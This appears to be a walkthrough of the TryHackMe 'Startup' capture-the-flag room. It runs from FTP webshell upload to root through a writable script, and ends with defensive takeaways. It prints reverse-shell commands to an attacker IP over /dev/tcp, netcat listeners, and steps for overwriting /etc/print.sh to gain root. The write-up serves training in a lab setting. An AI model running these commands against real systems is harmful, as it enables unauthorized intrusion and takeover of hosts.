# TryHackMe — Startup (Easy) Walkthrough

> Room: **Startup** (Easy)  
> Goal: Gain initial access, retrieve the user flag, then escalate to root.

This box is a classic chain:
**Nmap → anonymous FTP with web directory → upload webshell → RCE → packet analysis for creds → SSH → script manipulation for root**

---

## 1) Recon (Nmap)

Run a full TCP scan with default scripts and version detection:

```/dev/null/nmap.txt#L1-1
nmap -p- -sC -sV -T4 --min-rate=1000 -oN nmap_scan.txt <IP_ADDRESS>
```

### Results (key ports)

- `21/tcp` — FTP (vsftpd 3.0.3)
  - Anonymous login allowed
  - Contains files: `important.jpg`, `notice.txt`
  - `/ftp` directory is writable
- `22/tcp` — SSH (OpenSSH 7.2p2)
- `80/tcp` — HTTP (Apache 2.4.18)
  - Shows a "Maintenance" page

**Key observation:** Anonymous FTP with a writable directory suggests a file upload vector.

---

## 2) Web enumeration (Gobuster)

Check for hidden web directories:

```/dev/null/gobuster.txt#L1-1
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

Notable discovery:
- `/files/` directory

---

## 3) FTP analysis and connection

Connect via anonymous FTP:

```/dev/null/ftp.txt#L1-3
ftp <IP_ADDRESS>
Name: anonymous
Password: anonymous
```

Examine the contents:

```/dev/null/ftp_ls.txt#L1-2
ls -la
cd ftp
```

Key findings:
- `notice.txt` mentions a user named "maya"
- `/ftp` directory has write permissions
- The FTP `/ftp` directory appears to be accessible via the web at `/files/ftp/`

---

## 4) Upload webshell via FTP → RCE

### 4.1 Generate a reverse shell payload

Create a PHP reverse shell (adjust IP and port):

```/dev/null/revshell.txt#L1-1
bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
```

Save this in a PHP file (e.g., `rev.php`) or use a pre-built PHP reverse shell.

### 4.2 Upload via FTP

In the FTP session:

```/dev/null/ftp_upload.txt#L1-3
cd ftp
put rev.php
ls
```

### 4.3 Start listener and trigger the shell

On your attacking machine:

```/dev/null/listener.txt#L1-1
nc -lvnp 4444
```

Trigger the shell by visiting:

```/dev/null/web_trigger.txt#L1-1
http://<IP_ADDRESS>/files/ftp/rev.php
```

You should receive a shell as `www-data`.

---

## 5) Stabilize the shell

```/dev/null/stabilize.txt#L1-5
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter
export TERM=xterm
```

---

## 6) Local enumeration and credential discovery

### 6.1 Find the first ingredient/flag

As `www-data`, look around the web directory for files. You should find the first flag.

### 6.2 Discover the incidents directory

During enumeration, you'll find a directory containing network capture files (likely in `/incidents/` or similar location).

Download the capture file:

```/dev/null/python_server.txt#L1-1
python3 -m http.server 8000
```

On your attacking machine:

```/dev/null/wget_pcap.txt#L1-1
wget http://<IP_ADDRESS>:8000/suspicious.pcapng
```

### 6.3 Analyze the packet capture

Open the capture in Wireshark and look for:
- Login attempts
- Clear-text credentials
- User activity

You should find credentials for user `lennie`.

---

## 7) SSH access as lennie → user flag

SSH into the target using the discovered credentials:

```/dev/null/ssh_lennie.txt#L1-1
ssh lennie@<IP_ADDRESS>
```

Retrieve the user flag from lennie's home directory.

---

## 8) Privilege escalation to root (script manipulation)

### 8.1 Enumerate lennie's environment

Look around lennie's home directory and system for escalation vectors:

```/dev/null/find_scripts.txt#L1-1
find /home/lennie -type f -name "*.sh" 2>/dev/null
```

### 8.2 Analyze the planner.sh script

You should find a script owned by root but readable by lennie:

```/dev/null/planner_analysis.txt#L1-2
ls -la /home/lennie/scripts/planner.sh
cat /home/lennie/scripts/planner.sh
```

The script content should be something like:

```/dev/null/planner_content.txt#L1-4
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

### 8.3 Check the print.sh script

```/dev/null/print_check.txt#L1-2
ls -la /etc/print.sh
cat /etc/print.sh
```

Key observation: `/etc/print.sh` is owned by `lennie` and writable, but executed by the root-owned `planner.sh`.

### 8.4 Modify print.sh for privilege escalation

Replace the content of `/etc/print.sh` with a reverse shell:

```/dev/null/modify_print.txt#L1-2
echo 'bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1' > /etc/print.sh
cat /etc/print.sh
```

### 8.5 Set up listener and trigger escalation

On your attacking machine:

```/dev/null/root_listener.txt#L1-1
nc -lvnp 5555
```

Execute the planner script (or wait for it to run automatically):

```/dev/null/trigger_planner.txt#L1-1
/home/lennie/scripts/planner.sh
```

You should receive a root shell.

### 8.6 Alternative: spawn interactive shell

Instead of a reverse shell, you could modify `/etc/print.sh` to:

```/dev/null/spawn_shell.txt#L1-1
echo '/bin/bash' > /etc/print.sh
```

Then run `planner.sh` to get an interactive root shell directly.

---

## 9) Retrieve root flag

Once you have root access:

```/dev/null/root_flag.txt#L1-2
whoami
cat /root/root.txt
```

---

## Summary (attack chain)

1. Nmap → find FTP, SSH, HTTP
2. Anonymous FTP → discover writable `/ftp` directory
3. Web enum → find `/files/ftp/` maps to FTP directory
4. Upload PHP webshell via FTP → trigger via web → RCE as `www-data`
5. Find packet capture → analyze in Wireshark → recover `lennie` credentials
6. SSH as `lennie` → user flag
7. Find `planner.sh` (root-owned) calls `/etc/print.sh` (lennie-owned)
8. Modify `/etc/print.sh` → trigger `planner.sh` → root shell → root flag

---

## Notes / Defensive takeaways

- Disable anonymous FTP or restrict it to a non-web-accessible directory
- Don't map FTP directories directly under the web root
- Avoid having root-owned scripts execute user-writable scripts
- Monitor for unusual network traffic and file uploads
- Implement proper file upload restrictions and validation